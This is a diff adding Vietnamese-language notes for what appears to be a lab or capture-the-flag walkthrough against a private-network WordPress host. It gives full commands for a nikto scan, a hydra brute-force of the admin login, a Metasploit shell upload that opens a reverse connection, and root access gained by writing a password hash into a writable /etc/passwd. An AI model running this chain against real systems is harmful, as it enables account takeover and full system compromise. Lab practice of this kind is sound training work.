@@ -1,0 +1,39 @@
+Linux privilege escalation
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Windows privilege escalation
+https://www.fuzzysecurity.com/tutorials/16.html
+
+sử dụng nikto để quét thông tin website
+nikto -h 192.168.27.166
+-> uri /secret
+
+sử dụng hydra để brute-force tài khoản portal admin: http://192.168.27.166/secret/wp-login.php
+
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+-> username: admin - password: admin
+
+sử dụng metasploit để khai thác RCE hệ thống
+msfconsole -q
+use exploit/unix/webapp/wp_admin_shell_upload
+set username admin
+set password admin
+set target uri /secret/
+set rhosts 192.168.27.166
+set lhost 192.168.27.160
+exploit
+
+download linuxprivchecker
+
+https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+trên máy mục tiêu sử dụng wget để download file linuxprivchecker.py
+chmod 777 linixprivchecker.py
+./linuxprivchecker.py 
+-> Cho phép user www-data ghi vào file /etc/passwd
+Trên máy Kali Linux sử dụng lệnh sau để tự tạo mật khẩu root_hash:
+openssl passwd -1
+
+Dán root_hash vừa tạo ở fields root:x (xoá chữ x rồi dán root_hash vào)
+Save file /etc/passwd lại và sử dụng su root để đăng nhập tài khoản root.
